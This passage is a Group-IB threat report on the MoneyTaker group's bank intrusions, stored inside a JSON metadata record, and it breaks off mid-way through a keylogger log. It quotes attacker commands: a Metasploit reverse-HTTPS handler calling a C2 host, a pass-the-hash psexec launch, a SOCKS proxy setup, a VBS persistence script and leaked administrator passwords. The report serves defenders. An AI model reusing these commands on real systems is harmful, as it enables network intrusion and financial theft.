{
    "id": "8774d943-2dc5-4b45-b77e-57fe61b9e38b",
    "created_at": "2022-10-25T16:48:17.303068Z",
    "updated_at": "2025-03-27T02:09:59.993505Z",
    "deleted_at": null,
    "sha1_hash": "7a57e05aab003604657afa1bb06af954004215c7",
    "title": "",
    "authors": "",
    "file_creation_date": "2017-12-11T16:58:39Z",
    "file_modification_date": "2017-12-11T16:58:46Z",
    "file_size": 1423448,
    "plain_text": "# MoneyTaker\n\n#### 1.5 YEARS OF SILENT OPERATIONS\n\n###### December 2017 www.group-ib.com\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 2\n\n### TABLE OF CONTENTS\n\n###### Summary 3\n\n Attack infrastructure 7\n\n Provision of the malware survivability 11\n\n Propagation across the network 12\n\n Spying on legitimate users 15\n\n Attack on AWS CBR 19\n\n Potential attacks on SWIFT 25\n\n Attack on card processing 26\n\n Using banking Trojans 27\n\n Using POS Trojans 28\n\n Recommendations 29\n\n Indicators of compromise 31\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 3\n\n###### 01\n### SUMMARY\n\n\nFrom May 2016 to November\n2017, at least 20 organisations\nwere attacked in the United\nStates, UK and Russia. At\nleast one of the US banks was\nsuccessfully robbed twice.\n\nIn addition to money, attackers\nstole documentation related\nto the interbank payment\nsystems, which appear to have\nbeen obtained to prepare\nfurther attacks.\n\nBased on analysis of these\nincidents, attack tools and\nthe tactics applied, we have\nconcluded that the same\ngroup, which Group-IB has\ndubbed MoneyTaker (after the\nmalware used) is behind these\nattacks. It is interesting to note\nthat despite the effectiveness\nof the attacks, they have gone\ncompletely unreported till now.\n\n\n###### Targets\n\n- In total Group-IB has confirmed at least 20 companies as\nvictims of the MoneyTaker group, 16 of which are located\nin the US. The vast majority of them are small community\nbanks, where hackers attacked card processing systems. The\naverage damage from each successful attack was 500,000\nUSD baseline.\n\n- Criminals stole documentation for OceanSystems’ FedLink\ncard processing system, which is used by 200 banks in Latin\nAmerica and the US. We believe that banks operating on this\ninfrastructure are at risk of being amongst the next targets of\nMoneyTaker group.\n\n- In Russia, they focus on attacks on the system of interbank\ntransfers AWS CBR (Russian Interbank payment system). The\naverage amount of damage caused by this theft scheme is\n1.2 million USD per incident. That said, the affected banks\nmanaged to return some portion of the stolen money.\n\n###### Tools and tactics \n\nAttackers use both borrowed and their own self-written tools.\nWhen attacking, hackers act creatively and wisely: they use «onetime» infrastructure and carefully erase traces of their activity\npost-incident.\n\nInfiltration\n\n- To penetrate the corporate network, the group uses legitimate\npen testing tools - Metasploit and PowerShell Empire.\n\n- After successful infection, they carefully erase malware\ntraces. However, when investigating one of the incidents, we\nmanaged to discover the initial point of compromise: hackers\npenetrated the bank’s internal network by gaining access to\nthe home computer of the bank’s system administrator.\n\nStealthy techniques\n\n- The group uses ‘fileless’ malware which only exists in RAM\nand is removed on rebooting.\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 4\n\n- To protect C&C communications from being detected by\nsecurity teams, hackers employ SSL certificates generated\nusing names of well-known brands: Bank of America, Federal\nReserve Bank, Microsoft, Yahoo, etc.\n\n- Servers used to perform initial infection are one-time\ncomponents which are changed immediately after a successful\ninfection.\n\nAttack tools\n\nMembers of the group are skilled enough to promptly adjust the\ntools applied. In some cases, they made changes to the source\ncode ‘on the fly’ - during the attack.\n\nCreated tools Borrowed tools\n\nMoneyTaker 5.0 - malicious program Metasploit and PowerShell Empire\nfor auto replacement of payment data\nin AWS CBR\n\n‘Screenshotter’ and ‘keylogger’ to Privilege escalation tools, whose code\nconduct espionage and capture were demonstrated as a Proof of Concept\nkeystrokes at ZeroNights cybersecurity conference in\n\nMoscow in 2016. More data provided later in\nthis report\n\nMoneytaker ‘Auto-replacement’ Citadel and Kronos Banking Trojans. The\nprogram to substitute payment details latter one was used to deliver a Point-of-Sale\nin the interbank transfer system (POS) malware dubbed ScanPOS\n\n###### Tracking the attacks\n\n- Servers used to conduct the attacks were specifically\nconfigured to deliver the malicious payload to a predetermined list of IP addresses belonging to the target\ncompany. This methodology was employed by attackers to\nprevent the payload from falling into the hands of security\nanalysts and experts.\n\n- After each round of attacks, hackers deploy new infrastructure\nfor network persistence.\n\n- In detected incidents, criminals used a program that should\nhave carefully removed all components of the programs\napplied. However, due to an error made by the developer,\nthe data were not deleted from the attacked machines, which\nenabled forensic experts to learn details of the hackers’\nactivity.\n\n|Created tools|Borrowed tools|\n|---|---|\n|MoneyTaker 5.0 - malicious program for auto replacement of payment data in AWS CBR|Metasploit and PowerShell Empire|\n|‘Screenshotter’ and ‘keylogger’ to conduct espionage and capture keystrokes|Privilege escalation tools, whose code were demonstrated as a Proof of Concept at ZeroNights cybersecurity conference in Moscow in 2016. More data provided later in this report|\n|Moneytaker ‘Auto-replacement’ program to substitute payment details in the interbank transfer system|Citadel and Kronos Banking Trojans. The latter one was used to deliver a Point-of-Sale (POS) malware dubbed ScanPOS|\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 5\n\n###### Interrelations between incidents\n\nIn 1.5 years, Group-IB confirmed 20 incidents in total. Initially\nwe divided these incidents into three groups and considered\nthem as separate. However, through in-depth investigation of\nthe infrastructure, tools, and tactics applied, which will be further\ncovered in this report, we have concluded that one group is\nbehind all these attacks – MoneyTaker. This is supported by\ntechnical analysis provided later in this report:\n\n|Group 1|Group 2|Group 3|\n|---|---|---|\n|17 incidents in US and UK organizations. In the majority of instances, hackers used the same C&C server to control the initial part of their attacks. In some cases, we saw a similar use of the infrastructure from which remote connections were performed using LogMeIn.|2 incidents occurred in Russia in the autumn of 2016. The two attacks occurred at the same time; in both cases Meterpreter was used to attack the same target – servers of the Russian interbank transfer system (AWS CBR).|1 incident in Russia in the autumn of 2017. The attack was conducted on the AWS CBR using Meterpreter.|\n|Common features of Groups 1-3 • Metasploit used to infiltrate corporate networks • SSL certificates generated using popular brands to protect traffic between Meterpreter and C&C • Russian-speaking attackers • Own developers who create unique tools • Modification of the malicious code during attack • Covering tracks of the initial infection vector • Setting up forwarding corporate emails to Yandex and Mail.ru, free mail services.|||\n||Common features of Groups 2 and 3 • Originally targeted AWS CBR in Russia • Using domains in the .ga zone • Similar manner of propagation across the network. • The same hosting service used in the incidents in 2016 and 2017||\n|Common features of Groups 1 and 2 In both groups of incidents, UltraVNC 1.1.9.4 was used. This version was available back in 2013. The current version of this remote access tool was 1.2.0.6 at the time of attacks in Russia and the US.|||\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 6\n\n**Software & service**\n**provider, UK**\n\n**US Financial Services Provider**\n**(Breach not confirmed)**\n\n**Bank, Russia**\n\n**Bank, USA** **Bank,Russia**\n**First Data STAR** **AWS CBR**\n\n##### 2016\n\nJANUARY FEBRUARY MARCH APRIL MAY JUNE JULY AUGUST SEPTEMBER OCTOBER NOVEMBER DECEMBER\n\n**Bank, USA, UT**\n\n**Bank, USA, NY**\n\n**Bank, USA, VA**\n\n**Bank, USA, CO**\n\n**Bank, USA, FL** **Bank, USA, SC** **Credit Union, USA**\n\n**Bank, Russia**\n\n**Bank, USA, IL** **Bank, USA, IL** **AWS CBR**\n\n**Bank, USA, WI** **Bank, USA, OK**\n\n##### 2017\n\nJANUARY FEBRUARY MARCH APRIL MAY JUNE JULY AUGUST SEPTEMBER OCTOBER NOVEMBER DECEMBER\n\n**Bank, USA, MO**\n\n**Bank, USA, CA**\n\n**Law Firm, USA, NC**\n\n**Bank, USA, CA**\n\n###### Timeline of initial infections in attacks:\n\n- The very first attack, which Group-IB attributes to MoneyTaker\nwas conducted in the spring of 2016, when funds were stolen\nfrom a US bank by gaining access to First Data’s STAR card\nprocessing system.\n\n- In September 2016, Group-IB tracked several attacks on banks\nin Russia. The main target was the AWS CBR (Automated Work\nStation Client of the Russian Central Bank), a Russian interbank\nfund transfer system similar to SWIFT. After a successful theft\nfrom one of the attacked banks, the incidents stopped, similar\nto the case of theft in the United States.\n\n- In November 2016, attackers deployed new infrastructure,\nwhich was then used to attack banks in the United States. The\nlast activity in this wave of attacks was tracked in June 2017.\n\n- In November 2017, we observed a new successful attack by\nthis group in Russia. Like in 2016, they managed to steal funds\nthrough the interbank transfers system.\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 7\n\n###### 02\n\n### ATTACK INFRASTRUCTURE\n\nTo conduct targeted attacks, hackers use a distributed\ninfrastructure that is difficult to track.\n\nA rather unique feature of the infrastructure is the presence of a\nPersistence server, which delivers the payload only to real victims\nwhose IP addresses are added to the whitelist.\n\n###### 1 Stager request payload\n\n 2 Payload\n\n**Pentest framework**\n**and backconnect**\n**server**\n\n**Setup encrypted tunnel**\n\n###### 3\n\n**with backconnect**\n\n###### VICTIM\n\n**Request stager**\n\n###### 4\n\n**after reboot**\n\n**Persistence server** **Response with stager**\n**(response to** **5**\n**whitelisted IPs)** **if IP in whitelist**\n\n###### Pentest framework server\n\nThis server is used to perform the main activity. On it, hackers\ninstall a legitimate tool for penetration testing - Metasploit to\nfurther control the full attack.\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 8\n\nName SHA256 Type\n\nasys.exe 6ce7c4cb9e51116a4565e9b2e129335a4d23cfc51a32080aa9f25689cb1c6ef2 Meterpreter\n\nlaunch-paranoidf98b0220a11b57e3c812e7f86f5e5c3f8bbdb5d5ce9dc7b721e28a7f28ecb1ef Meterpreter\nstageless3.exe\n\nmsc.exe, msc3.exe 0b778857bbc4ec36020d021f475ff90550134beb9506c53071652421e10ddfff Meterpreter\n\nmsc4.exe 53c789565821b6eb64bd7f002e38b8259bde3bbbb39798c82657b2b5d59bcd9f Meterpreter\n\nmsc5.exe 98fb846df3687b3c9c7fa66f39d6c70948e8330489be7c787e1f2c3b23f8d205 Meterpreter\n\nmsc6.exe 92afe22f494a849345b18d2b302e71a4336871a7956795a7188280e4c7bd8607 Meterpreter\n\nmsc7.exe 73b8ed8f14ec2260ae332603f723a5eb0a52c4c997454904e3d5ff254a27a6e6 Meterpreter\n\ncmd.exe 7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f Meterpreter stager\n\nmencstager.exe 7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f Meterpreter stager\n\nmsdefender.bat 8cfeb71eaaa3df217e15a449bc4656841b58a4737760d956b1c8e6039cff61e6 Meterpreter stager\n\nse.vbs ff999c968bce81987cab47a02a3b176042489d82644d4c6fb13d5c8c1244cbcc Meterpreter stager\n\nrc4.dll 8a0be0a97ba19d4498b58365d36ba5461039e41f73bbd745b15b80fc21e38c3f Meterpreter stager\n\nrc4.exe a7035c20c32ad4cd1cc76b211f6258fc5858e4bc43031d04e3655b38b666c0c4 Meterpreter stager\n\nrc4.hta 72ee03b51544002df3e25d1a730e650389bdbd5f1cff91488ed9e05944b3cb52 Meterpreter stager\n\nproxystager.bat 3a163bb0a8abe244815836a05fab48b640ec537bd76c92b7857db18657d2a774 Meterpreter stager\n\nps.bat 9e9149ae6092c4a5bd4cb36cf40ec660e3ee10e76834340bf1234186315ca808 Meterpreter stager\n\nWhen the payload (Meterpreter) runs on a compromised host, it\ninitiates outbound SSL connections which helps to avoid detection\nof suspicious connections by network security systems. Below is\ncode executed within the Metasploit console by the attacker:\n\n|Name|SHA256|Type|\n|---|---|---|\n|asys.exe|6ce7c4cb9e51116a4565e9b2e129335a4d23cfc51a32080aa9f25689cb1c6ef2|Meterpreter|\n|launch-paranoid- stageless3.exe|f98b0220a11b57e3c812e7f86f5e5c3f8bbdb5d5ce9dc7b721e28a7f28ecb1ef|Meterpreter|\n|msc.exe, msc3.exe|0b778857bbc4ec36020d021f475ff90550134beb9506c53071652421e10ddfff|Meterpreter|\n|msc4.exe|53c789565821b6eb64bd7f002e38b8259bde3bbbb39798c82657b2b5d59bcd9f|Meterpreter|\n|msc5.exe|98fb846df3687b3c9c7fa66f39d6c70948e8330489be7c787e1f2c3b23f8d205|Meterpreter|\n|msc6.exe|92afe22f494a849345b18d2b302e71a4336871a7956795a7188280e4c7bd8607|Meterpreter|\n|msc7.exe|73b8ed8f14ec2260ae332603f723a5eb0a52c4c997454904e3d5ff254a27a6e6|Meterpreter|\n|cmd.exe|7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f|Meterpreter stager|\n|mencstager.exe|7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f|Meterpreter stager|\n|msdefender.bat|8cfeb71eaaa3df217e15a449bc4656841b58a4737760d956b1c8e6039cff61e6|Meterpreter stager|\n|se.vbs|ff999c968bce81987cab47a02a3b176042489d82644d4c6fb13d5c8c1244cbcc|Meterpreter stager|\n|rc4.dll|8a0be0a97ba19d4498b58365d36ba5461039e41f73bbd745b15b80fc21e38c3f|Meterpreter stager|\n|rc4.exe|a7035c20c32ad4cd1cc76b211f6258fc5858e4bc43031d04e3655b38b666c0c4|Meterpreter stager|\n|rc4.hta|72ee03b51544002df3e25d1a730e650389bdbd5f1cff91488ed9e05944b3cb52|Meterpreter stager|\n|proxystager.bat|3a163bb0a8abe244815836a05fab48b640ec537bd76c92b7857db18657d2a774|Meterpreter stager|\n|ps.bat|9e9149ae6092c4a5bd4cb36cf40ec660e3ee10e76834340bf1234186315ca808|Meterpreter stager|\n\n```\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse _ https\nset LHOST _ c2serverIP _\nset LPORT 443\nset HandlerSSLCert /root/.msf4/loot/20161031010327 _\ndefault _ 46.228.47.114 _ www.yahoo.com _ pe _ 399345.pem\nset StagerVerifySSLCert true\nset EnableStageEncoding true\nset StageEncoder x86/shikata _ ga _ nai\nset ExitOnSession false\n\n```\n\nBy default, Metasploit generates self-signed SSL certificates and\nspecifies random values in the following fields: Valid from, Valid\ntill, Common name. Such certificates can also cause suspicion.\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 9\n\nIn order to avoid detection, the MoneyTaker group generates selfsigned SSL certificates before the attack, indicating the names of\npopular brands in the fields, instead of filling them out randomly.\n\nGroup-IB specialists have discovered the use of the following\ncertificates:\n\nSSL fingerprint IP, where SSL was used\n\n8b7fa4ef88a303bb47240c9b8012c80507074f2e 83.220.172.71\n\n37.46.133.190\nc29d79df9b5416fd416c31e57cd525dfc23a8f66\n\n172.86.121.11\n\nb3dd855fc1b32757bde5c9f737808f150d6f57e6 146.185.243.19\n\n98cbe44e1a30448a3ff6be38e8b277ae189f9b45 82.146.54.5\n\n5fe7f5924ee2382dbfa5c8bdc6d04f0ff5d9273a 188.120.235.201\n\n188.120.230.218\n5922a06f03f6464921462c07842afb18da1577e9\n\n188.120.230.235\n\n7aa02d827609e0b6b3dca6d0ef82fe3a1fbe1d67 185.141.25.222\n\n###### Persistence server\n\nHackers try to stay as inconspicuous as possible, and therefore\nthey use ‘fileless’ malware which only exists in RAM and is\ndestroyed after reboot.\n\nThat said, PowerShell and VBS scripts help them to ensure\npersistence in the system.\n\nScripts provide the following benefits for attackers:\n\n                - Malicious scripts are hard to detect by means of antivirus\nprotection. Writing a signature for a script without false\npositives is much more difficult than a binary file.\n\n                - Scripts are easy to modify, which makes it easier for attackers\nto work.\n\n                - It is easy to ensure persistence. Typically, such scripts are\nstored in the registry or are called when certain events occur\nthrough Windows Management Instrumentation (WMI), Group\nPolicy Objects (GPOs), Scheduled task. Such scripts are very\nsimple and usually their main task is to download the main\nprogram from an external or local source and run it.\n\n|Issuer|SSL fingerprint|IP, where SSL was used|\n|---|---|---|\n|MetaBank LTD|8b7fa4ef88a303bb47240c9b8012c80507074f2e|83.220.172.71|\n|Yahoo Inc.|c29d79df9b5416fd416c31e57cd525dfc23a8f66|37.46.133.190 172.86.121.11|\n|Fiserv Inc|b3dd855fc1b32757bde5c9f737808f150d6f57e6|146.185.243.19|\n|Microsoft Ltd|98cbe44e1a30448a3ff6be38e8b277ae189f9b45|82.146.54.5|\n|Federal Reserve Bank|5fe7f5924ee2382dbfa5c8bdc6d04f0ff5d9273a|188.120.235.201|\n|Bank of America|5922a06f03f6464921462c07842afb18da1577e9|188.120.230.218 188.120.230.235|\n|VMware|7aa02d827609e0b6b3dca6d0ef82fe3a1fbe1d67|185.141.25.222|\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 10\n\nThe Persistence server is used to force a malicious file to\nbe launched if the attacked computer has been rebooted. A\ndistinctive feature of this group is the use of a separate server for\nthis goal.\n\nOn the server, they run a script that performs two checks:\n\n1. Checks if the User-agent field is equal to WinHttp. If it is not\nequal, requests are sent back to the web server with a 404\nerror code (page not found). If equal to WinHttp, it performs\nthe second check.\n\n2. Checks if the IP address from which the request is made is on\nthe white list. If yes, then the malicious file mencstager.exe is\ndelivered. If not, rundll32.exe is transferred. 51138beea3e2c21e\nc44d0932c71762a8 – a legitimate Windows file.\n\nThis verification complicates investigative activity of researchers\nwho cannot get the malicious file because they try to download it\nfrom an IP address that is not on the white list.\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 11\n\n\n### PROVISION OF THE MALWARE SURVIVABILITY\n\n\n###### 03\n\n\nUnlike other groups conducting targeted attacks, MoneyTaker\nuses standard techniques to provide malware survivability in the\nsystem.\n\nResearchers have not managed to recover the full picture of the\nincidents that occurred in the autumn of 2016 in Russia, because\ntracks of successful attacks were carefully removed. However,\nGroup-IB has discovered that hackers infiltrated the network\nof a Russian bank by gaining access to the home computer of\nthe bank’s system administrator. One of the methods to ensure\nmalware survivability in the system was the creation of services\nusing .bat scripts that launched the VNC server.\n\nThe contents of the at1.bat file:\n\n```\n«c:\\Program Files\\Cisco Systems\\VPN Client\\hostsec32.exe»\n-install «Host Security Server»\n\n```\n\nThe contents of the at2.bat file:\n\n```\n«c:\\Program Files\\Cisco Systems\\VPN Client\\hostsec32.exe»\n-uninstall «host security server»\n\n```\n\nThese batch files were called from Windows Task Scheduler.\n\nIn US incidents, the attacker used VBS scripts that created a link\nnamed «Task Scheduler» for a specific user in the startup to launch\nthe malicious file.\n\n```\nSet oWS = WScript.CreateObject(«WScript.Shell»)\nsLinkFile = «C:\\Users\\<%username%>\\AppData\\Roaming\\Microsoft\\\nWindows\\Start Menu\\Programs\\Startup\\taskhost.lnk»\nSet oLink = oWS.CreateShortcut(sLinkFile)\n  oLink.TargetPath = «C:\\Users\\<%username%>\\AppData\\Local\\ \n  Temp\\taskhost.exe»\n‘ oLink.Arguments = «»\n‘ oLink.Description = «Task Scheduler»  \n‘ oLink.HotKey = «ALT+CTRL+F»\n‘ oLink.IconLocation = «C:\\Users\\<%username%>\\AppData\\Local\\  \n  Temp\\taskhost.exe, 2»\n‘ oLink.WindowStyle = «1»  \n‘ oLink.WorkingDirectory = «C:\\Users\\<%username%>\\AppData\\\n  Local\\Temp»\noLink.Save\n\n```\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 12\n\n###### 04\n\n### PROPAGATION ACROSS THE NETWORK\n\nAfter successfully infecting one of the computers and gaining\ninitial access to the system, the attacker performs reconnaissance\nof the local network in order to gain domain administrator\nprivileges and eventually consolidate control over the network.\n\nHackers use the Metasploit tool to conduct network\nreconnaissance, search for vulnerable applications, exploit\nvulnerabilities, escalate systems privileges, and collect\ninformation.\n\n###### Gaining admin privileges\n\nTo escalate privileges up to the local administrator (or “SYSTEM”\nlocal user), attackers use exploit modules from the standard\nMetasploit pack, or exploits designed to bypass the UAC\ntechnology. With local administrator privileges they can use\nthe Mimikatz program, which is loaded into the memory using\nMeterpreter, to extract unencrypted Windows credentials.\n\nIn addition to the standard modules from the Metasploit pack, the\nfollowing tools are used to escalate privileges:\n\nName MD5 Type\n\nASLRSideChannelAttack.exe 9a82aa5af19fa0a6167f87ee500856d53690c92c8c6449af54d8e5d33cf8bff4 LPE Win10x64\n\ncve.bat 7ff092853c15b51315414939c165ea9bce1f920d2d99e570d747ee7fc9fa734a BAT LPE executor\n\ncve.exe 98b6f9172ca273deef324f032a8e992b6e6ca3c6542449a48246b3646b6c8cb6 cve-2016-7255\n\ncve-2016-7255.exe 5ec6a6c9a7233a7ff68d989d830a2249e94a2784e69d5c8a593d3345da14a6b5 cve-2016-7255\n\ncve-2016-7255test.exe df69966d721193e2315723dd71636b93cc76b38cfa046dce45d7aec4856f4bee cve-2016-7255\n\nIt is interesting to analyze the ASLRSideChannelAttack.exe file. It\nwas compiled on October 23, 2016 based on codes presented at\nthe Russian conference ZeroNights 2016. The codes are available\nonline at https://github.com/IOActive/I-know-where-your-pagelives.\n\n|Name|MD5|Type|\n|---|---|---|\n|ASLRSideChannelAttack.exe|9a82aa5af19fa0a6167f87ee500856d53690c92c8c6449af54d8e5d33cf8bff4|LPE Win10x64|\n|cve.bat|7ff092853c15b51315414939c165ea9bce1f920d2d99e570d747ee7fc9fa734a|BAT LPE executor|\n|cve.exe|98b6f9172ca273deef324f032a8e992b6e6ca3c6542449a48246b3646b6c8cb6|cve-2016-7255|\n|cve-2016-7255.exe|5ec6a6c9a7233a7ff68d989d830a2249e94a2784e69d5c8a593d3345da14a6b5|cve-2016-7255|\n|cve-2016-7255test.exe|df69966d721193e2315723dd71636b93cc76b38cfa046dce45d7aec4856f4bee|cve-2016-7255|\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 13\n\nIn addition, they actively searched for passwords stored in Active\nDirectory group policies by exploiting the MS14-025 vulnerability\nand the corresponding Metasploit module (post/windows/gather/\ncredentials/gpp).\n\nAfter receiving group policy files, the attacker decrypted the\npasswords that were stored there and used them on other\nworkstations. In some cases, passwords of bank systems’\naccounts granting local administrator privileges were very weak.\nHere is an example of domain administrator passwords that\nattackers recovered:\n\nEncrypted value of the password field Decrypted password\n\nUj80N3lMoEtnIXIP+dTzzBK/2/mALyumPkQaj9249KY Wrongpassword1\n\nn8rOHPvtmB1j24AV7EYclWS6DgQWaoQkfqzOZVlBLzI System321\n\nUsing the Metasploit modules with the functionality of dumping\nWindows local users’ password hashes stored in the Security\nAccounts Manager (hashdump or smart_hashdump modules),\nhackers received the local administrator’s NTLM hash, as well as\nthe NTLM hash and unencrypted password for domain users.\n\n###### Propagation across the network\n\nTo get the list of computers in Active Directory, hackers often use\na PowerShell script named allpc.ps1, which was copied from this\ndiscussion in October 2015:\n\nhttps://serverfault.com/questions/732681/export-simple-list-of-allcomputers-in-multiple-ous-in-ad\n\nTo propagate across the network, hackers used a legitimate tool\npsexec, which is typical for network administrators. This tool\ncreates a local service via SMB/RPC protocol, then executes and\ndeletes it. In the service properties, the required command is set\nto start. The attacker used two methods to distribute the payload:\nthey placed executable files in the network folder, and forced\nthe attacked computers to start them, or indicated the shell code\ndirectly in the service start line.\n\nFor passwords that were received as an NTLM hash and were not\ndecrypted, the Pass-the-hash technique was used, which allows\nusing an NTLM hash for authentication without password. To do\nthis, the same legitimate Metasploit’s psexec modules were used\nwithout any modification.\n\n|User name|Encrypted value of the password field|Decrypted password|\n|---|---|---|\n|Administrator|Uj80N3lMoEtnIXIP+dTzzBK/2/mALyumPkQaj9249KY|Wrongpassword1|\n|Administrator|n8rOHPvtmB1j24AV7EYclWS6DgQWaoQkfqzOZVlBLzI|System321|\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 14\n\n```\nuse auxiliary/admin/smb/psexec _ command\nset COMMAND start \\\\\\\\10.1.5.35\\\\tmp\\\\msc7.exe\nset RHOSTS 10.1.5.35\nset SMBUser Administrator\nset SMBPass aad3b435b51404eeaad3b435b51404ee:23cec95759ea5880\nadf1794f475c23cd\nset SMBDomain WORKGROUP\n\n```\n\nAfter gaining access to new systems, attackers repeated the\nabove-mentioned procedure to collect passwords.\n\n###### Remote access\n\nUntil October 2017, hackers remotely accessed systems of interest\nusing standard Metasploit tools, as well as legitimate remote\naccess programs.\n\nOn hosts where Meterpreter was launched, hackers set up a\nSOCKS proxy server, which allowed them to remotely send\ncommands within the local network. To create a connection via\nSOCKS proxy, they primarily used ports 7080 and 1808:\n\n```\nuse auxiliary/server/socks4a\nshow options\nset SRVHOST _ c2serverIP _\nset SRVPORT 7080\n\n```\n\nIn addition, they actively used various VNC clients such as Fileless\nVNC, VNC, UltraVNC and TightVNC Portable versions x32 and\nx64.\n\nIn the US, they used the LogMeIn Hamachi solution for remote\naccess.\n\nIn one incident, to ensure continuous remote access, hackers\ngained access to the firewall, where they configured a tunnel to\nthe C&C server.\n\nAlso, to secure connections to its C&C server, hackers established\nan SSH tunnel using a legitimate tool - Plink.\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 15\n\n###### 05\n\n### SPYING ON LEGITIMATE USERS\n\nTo conduct a successful attack, hackers need to monitor legitimate\nactivity of the victim bank’s users and financial operators to then\nrepeat the same actions.\n\nThe MoneyTaker group uses the following tools to spy on\nemployees:\n\n                          - A legitimate tool NirCmd\n\n                          - Self-developed tools - ‘screenshotter’ and ‘keylogger’\n\nNirCmd is a small command-line utility, with the functionality\nsimilar to psexec. It allows hackers to remotely execute various\ncommands: write and delete values and keys in the Registry, write\nvalues into INI file, connect to a VPN network, restart windows or\nshut down the computer, change the created/modified date of a\nfile, change display settings, turn off the monitor, and many more.\n\nOne of the most important capabilities for attackers is taking\nscreenshots. For example, by running the following command:\n\n```\nnircmd.exe loop 10 60000 savescreenshot c:\\temp\\\nscr~$currdate.MM _ dd _ yyyy$-~$currtime.HH _ mm _ ss$.png\n\n```\n\n10 screenshots will be taken with an interval of 60 seconds.\n\nHowever, this functionality was not enough for the group,\ntherefore they created their own unique tools designed to take\nscreenshots and capture keystrokes.\n\n|Name|MD5|Type|\n|---|---|---|\n|perfmon.exe|2049df4a5f92709bad14a7e2b8c0cfcb6ede2f71009cb3483892108 e949800e6|Dropper of Keylogger/Screenshotter|\n|perfmonpe.exe|ff3c84266fdba3638b9fc1a41cab87cf4021eb531954343d1a328b30 7b586ac6|Dropper of Keylogger/Screenshotter|\n|recycler.exe|206aec8132cbb2497553b1f2c1c40733188929bad2feb0640e99474 b327e564b|Dropper of Keylogger/Screenshotter|\n|xkey.exe|b2e02579cf0e9c2a57bff806b57d6b868d5d411264d38ff7ac7e6b4 7d0d2a33d|Keylogger/Screenshotter|\n|xkey_x86.dll|60e6652ae39ecd9314ba0e7936b41ca813737183c4eaa96dce0b4a 36a90375dd|Keylogger/Screenshotter|\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 16\n\nThese programs are designed to capture keystrokes, take\nscreenshots of the user’s desktop and get the contents from the\nclipboard. All this data can be stored in a file of the temporary\ndirectory.\n\n###### Dropper\n\nThis is an NSIS-packed downloader. Upon its launch it creates the\nfollowing files:\n\n```\n%Temp%\\datepicker-ru _ RU.js\n%Temp%\\LEJ%2BPamplona%2BSanta.jpg\n\n```\n%Temp%\\roknewsflash.css\n```\n%Temp%\\fonts.css\n%Temp%\\addons.css\n%Temp%\\tracker.php\n%Temp%\\mJ8OS5lCf8xFQQiX4F1Ei.sNXbnF1xay\n%Temp%\\<rnd _ chars>.tmp\\System.dll\n\n```\n\nThe dropper twice launches its own file as a child process.\n\nIt decrypts the data buffer, which is stored in the dropper in an\nencrypted form, and injects it into the child process (which is\nlaunched last). That is how the payload is started.\n\n###### Keylogger/Screenshotter\n\n- The application is compiled in Delphi. Its main form contains\ntext field components and 5 timers.\n\n- Based on the names of components in Portuguese, we assume\nthat either its author is Portuguese-speaking, or the campaign\ntargets Portuguese-speaking countries (for example, Brazil)\nor the code is based on the source code of the Portuguese\nprogram.\n\n- Functions of the application are executed once the timer\ntriggers (after the time interval, which is specified in this timer\nas the interval of the timer operation).\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 17\n\nStatus at the time Timer's triggering\nFunction Activity of the triggered timer\nof launch interval\n\nTimer activating\nenabled 10 seconds Triggers the activation timer\nAtivatTimer\n\nActivates the functions of the keylogger. Described\nKeylogger timer disabled 1 millisecond\nin detail below.\n\nTakes screenshots, dumps all the collected data into\nData export timer disabled 5 minutes\na file. Will be described below\n\nTriggers the keylogger timer and the data export\nActivation timer disabled 1 millisecond\ntimer; disables the activation timer (itself)\n\nTriggers the keylogger timer, and the data export\nDeactivation timer disabled 1 millisecond\ntimer; disables the deactivation timer (itself)\n\n                - Timers’ names mean that one of them is used to activate\nnetwork functions (InternetTimer), another one is used to send\ndata (EnviarTimer). However, in fact they perform other activity.\nInstead of activating the network functions, the «InternetTimer»\ntimer simply activates another timer, and the «EnviarTimer»\ntimer (translated as «sending timer») captures screenshots and\nuploads the collected data to a file in a temporary directory.\nThis may indicate that the source code of the file, which was\noriginally written for other purposes (including sending network\ndata), was then slightly modified.\n\n                - After the start, the application executes the TForm1.\nFormCreate() procedure, where it loads the necessary system\ndynamic libraries into the address space and looks for the\naddresses of the functions WinExec, GetAsyncKeyState,\nGetWindowTextA, GetForegroundWindow KeyloggerTimer in\nthem. When the timer triggers, it intercepts keystrokes. It also\nextracts the name of the application (the window title) in which\nthe key was pressed and the date / time of pressing.\nBelow is an example of a record of the keylogger log. Bold\nmarked are pressed keys or dialog box titles in which these keys\nwere entered\n\n|Timer name|Function|Status at the time Timer's triggering Activity of the triggered timer of launch interval|Col4|Col5|\n|---|---|---|---|---|\n|InternetTimer|Timer activating AtivatTimer|enabled|10 seconds|Triggers the activation timer|\n|KeyloggerTimer|Keylogger timer|disabled|1 millisecond|Activates the functions of the keylogger. Described in detail below.|\n|EnviarTimer|Data export timer|disabled|5 minutes|Takes screenshots, dumps all the collected data into a file. Will be described below|\n|AtivatTimer|Activation timer|disabled|1 millisecond|Triggers the keylogger timer and the data export timer; disables the activation timer (itself)|\n|DesativatTimer|Deactivation timer|disabled|1 millisecond|Triggers the keylogger timer, and the data export timer; disables the deactivation timer (itself)|\n\n```\n[F2][F9]</textarea><br><br><b><font color = «green»>[ Run\n- 2:53:54 - 11.11.2017 ] 